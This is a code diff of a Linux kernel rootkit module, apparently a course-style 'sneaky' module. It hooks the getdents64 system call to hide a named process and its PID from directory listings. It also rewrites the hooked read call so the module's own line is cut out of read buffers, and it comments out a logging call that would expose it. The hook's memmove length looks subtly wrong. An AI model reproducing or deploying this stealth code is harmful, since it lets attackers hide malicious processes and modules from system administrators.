@@ -75,7 +75,7 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
 
   while(curr_pos < original_result) {
     if((strcmp(curr_dirp->d_name, "sneaky_process") == 0) || (strcmp(curr_dirp->d_name, pid_txt) == 0)){
-      printk(KERN_INFO "File name %s \n", curr_dirp->d_name);
+      //printk(KERN_INFO "File name %s \n", curr_dirp->d_name);
       break;
     }
     curr_pos += curr_dirp->d_reclen;
@@ -90,7 +90,6 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
     sneaky_result -= deleted_size;
     struct linux_dirent64 *  next_dirp = (struct linux_dirent64 *) (regs->si + curr_pos + deleted_size);
     memmove(curr_dirp, next_dirp, remaining_size);
-    
   }
   
   return sneaky_result;
@@ -102,14 +101,27 @@ asmlinkage int (*original_read)(struct pt_regs *);
 asmlinkage int sneaky_sys_read(struct pt_regs *regs)
 {
   int original_result = (*original_read)(regs);
-  int sneaky_result = original_result;
 
-  char * original_buf = regs->si;
-  if(strncmp(original_buf, "sneaky_mod", 10) == 0){
-    char * sneaky_buf = strchr(original_buf, '\n');
-    printk(KERN_INFO "Sneaky read%s \n", sneaky_buf);
+  
+  char * original_buf = (char *) regs->si;
+  char * sneaky_mod_buf = strstr(original_buf, "sneaky_mod");
+  
+  if( sneaky_mod_buf != NULL){
+    char * after_sneaky_mod_buf = strchr(sneaky_mod_buf, '\n');
+    if(after_sneaky_mod_buf != NULL){
+
+      int line_size = after_sneaky_mod_buf - sneaky_mod_buf + 1;
+      int sneaky_result = original_result - line_size;
+      memmove(sneaky_mod_buf, after_sneaky_mod_buf + 1, original_result - line_size);
+      return sneaky_result;
+    }
+    else{
+      return original_result;
+    }
   }
-  return sneaky_result;
+  else{
+    return original_result;
+  }
 }
 
 // The code that gets executed when the module is loaded
